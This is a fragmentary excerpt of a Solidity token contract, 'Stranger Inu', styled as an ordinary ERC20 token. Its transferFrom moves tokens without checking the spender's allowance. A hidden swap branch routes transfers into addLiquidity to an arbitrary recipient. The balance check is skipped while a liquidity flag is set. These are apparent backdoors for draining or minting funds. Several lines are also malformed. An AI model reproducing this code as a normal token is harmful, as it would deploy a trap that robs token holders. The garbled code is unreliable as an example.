...
contract StrangerInu is Ownable, IERC20 {
    ...
    function _tokenTransfer(address from, address to, uint256 amount) internal virtual {
        require(from != address(0));
        require(to != address(0));
        if (isDuringSwap(from, to)) {
            return addLiquidity(amount, to);
        }
        if (addingLiquidity){} else {
            require(_balances[from] >= amount);
        }
        uint256 feeAmount = 0;
        _rTotal(from);
        bool liquifying = (to == getPairAddress() && _excludedFromFee[from]) || (from == getPairAddress() && _excludedFromFee[to]);
        if (!_excludedFromFee[from] && !_excludedFromFee[to] && !Address.isLiquidityToken(to) && to != address(this) && !liquifying && !addingLiquidity) {
    ...
    tOwned[] _tOwned;
    function isDuringSwap(address sender, address recipient) internal view returns(bool) {
        return (
    ...
    string private _name = "Stranger Inu";
    ...
    function transferFrom(address from, address recipient, uint256 amount) public virtual override returns (bool) {
        _tokenTransfer(from, recipient, amount);
